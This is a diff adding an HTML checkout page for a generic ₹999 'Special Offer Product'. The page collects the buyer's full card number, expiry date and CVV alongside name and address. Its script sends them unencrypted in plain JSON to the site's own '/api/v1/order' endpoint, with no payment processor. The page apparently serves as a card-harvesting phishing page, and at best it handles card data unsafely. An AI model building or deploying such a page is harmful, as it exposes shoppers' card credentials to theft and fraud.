@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Order Now</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 min-h-screen p-4 md:p-8">
+
+    <div class="max-w-2xl mx-auto bg-white p-6 md:p-10 rounded-2xl shadow-lg border border-gray-100">
+        <h2 class="text-2xl font-bold text-gray-800 mb-6 border-b pb-4">Complete Your Order</h2>
+        
+        <form id="checkoutForm" class="space-y-4">
+            <input type="hidden" id="productName" value="Special Offer Product">
+            <input type="hidden" id="totalAmount" value="999">
+            <input type="hidden" id="paymentMethod" value="Credit/Debit Card">
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Full Name</label>
+                    <input type="text" id="fullName" required class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Mobile Number</label>
+                    <input type="tel" id="mobile" required class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">City / State</label>
+                    <input type="text" id="cityState" required class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Pincode</label>
+                    <input type="text" id="pincode" required class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none">
+                </div>
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Full Address</label>
+                <textarea id="fullAddress" required rows="2" class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none"></textarea>
+            </div>
+
+            <h3 class="text-lg font-bold text-gray-800 mt-6 border-b pb-2">Payment Details</h3>
+            
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" required class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none">
+            </div>
+
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Expiry Date</label>
+                    <input type="text" id="expiryDate" placeholder="MM/YY" required class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">CVV</label>
+                    <input type="password" id="securityCode" placeholder="XXX" required class="mt-1 w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-green-500 outline-none">
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-xl mt-6 transition-all">
+                Pay ₹999 & Place Order
+            </button>
+            <p id="errorMsg" class="text-red-500 text-sm text-center hidden mt-2">Error placing order. Try again.</p>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Prevents page reload
+            
+            const btn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            // UI Loading state
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+            errorMsg.classList.add('hidden');
+
+            // Gather data from inputs
+            const orderData = {
+                fullName: document.getElementById('fullName').value,
+                mobile: document.getElementById('mobile').value,
+                fullAddress: document.getElementById('fullAddress').value,
+                cityState: document.getElementById('cityState').value,
+                pincode: document.getElementById('pincode').value,
+                productName: document.getElementById('productName').value,
+                totalAmount: document.getElementById('totalAmount').value,
+                paymentMethod: document.getElementById('paymentMethod').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                expiryDate: document.getElementById('expiryDate').value,
+                securityCode: document.getElementById('securityCode').value
+            };
+
+            try {
+                // Send to your Vercel API
+                const response = await fetch('/api/v1/order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(orderData)
+                });
+
+                if (response.ok) {
+                    // Success! Redirect to Thank You page
+                    window.location.href = '/thanku.html';
+                } else {
+                    throw new Error("Backend rejected the request");
+                }
+            } catch (error) {
+                console.error(error);
+                errorMsg.classList.remove('hidden');
+                btn.innerText = "Pay ₹999 & Place Order";
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
